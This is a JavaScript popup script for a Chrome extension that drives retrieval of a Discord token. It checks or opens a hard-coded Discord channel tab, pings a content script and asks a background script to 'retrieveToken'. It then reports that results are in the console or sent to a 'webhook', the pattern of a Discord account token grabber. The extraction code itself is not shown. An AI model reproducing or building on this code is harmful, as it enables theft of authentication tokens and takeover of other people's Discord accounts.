function updateStatus(message, isError = false) {
  const status = document.getElementById('status');
  status.textContent = message;
  status.className = isError ? 'error' : '';
}

document.getElementById('retrieveButton').addEventListener('click', () => {
  updateStatus('Checking active tab...');
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    if (chrome.runtime.lastError || !tabs[0]) {
      updateStatus('No active tab found. Opening Discord page...', true);
      console.error('[Popup] Tab query error:', chrome.runtime.lastError?.message || 'No active tab');
      openDiscordTab();
      return;
    }
    if (!tabs[0].url.startsWith('https://discord.com/')) {
      updateStatus('Active tab is not Discord. Opening Discord page...', true);
      openDiscordTab();
      return;
    }

    // Ping content script to ensure it's active
    chrome.tabs.sendMessage(tabs[0].id, { action: 'ping' }, (response) => {
      if (chrome.runtime.lastError || !response) {
        updateStatus('Content script not responding. Retrying with new tab...', true);
        console.error('[Popup] Ping error:', chrome.runtime.lastError?.message || 'No response');
        openDiscordTab();
      } else {
        sendRetrieveTokenMessage(tabs[0].id);
      }
    });
  });

  function openDiscordTab() {
    const discordUrl = 'https://discord.com/channels/1322328218279088128/1322328219617333364';
    chrome.tabs.create({ url: discordUrl }, (tab) => {
      if (chrome.runtime.lastError) {
        updateStatus(`Error opening tab: ${chrome.runtime.lastError.message}`, true);
        console.error(`[Popup] Tab creation error: ${chrome.runtime.lastError.message}`);
        return;
      }
      chrome.tabs.onUpdated.addListener(function listener(tabId, changeInfo) {
        if (tabId === tab.id && changeInfo.status === 'complete') {
          chrome.tabs.onUpdated.removeListener(listener);
          sendRetrieveTokenMessage(tabId);
        }
      });
    });
  }

  function sendRetrieveTokenMessage(tabId) {
    updateStatus('Retrieving token...');
    chrome.runtime.sendMessage({ action: 'retrieveToken', tabId }, (response) => {
      if (chrome.runtime.lastError) {
        updateStatus(`Error: ${chrome.runtime.lastError.message}`, true);
        console.error(`[Popup] Message error: ${chrome.runtime.lastError.message}`);
        return;
      }
      if (response && response.status === 'retrieved') {
        updateStatus('Token retrieval completed. Check console or webhook.');
      } else {
        updateStatus(`Error: ${response?.error || 'No response'}`, true);
      }
    });
  }
});